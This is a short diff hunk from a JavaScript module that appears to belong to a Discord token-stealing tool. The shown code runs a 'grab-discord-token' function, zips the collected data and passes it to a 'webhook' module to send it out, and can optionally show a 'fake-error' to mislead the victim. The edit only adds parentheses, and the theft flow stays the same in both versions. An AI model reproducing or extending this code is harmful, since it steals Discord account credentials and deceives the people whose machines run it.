@@ -41,7 +41,7 @@ module.exports = async () => {
   }
   await require('../functions/grab-discord-token');
   await sleep(500);
-  require('../functions/zip').then(await require('../functions/webhook'));
+  require('../functions/zip').then(await (require('../functions/webhook')));
 
   config.fakeError && require('../functions/fake-error');
 };
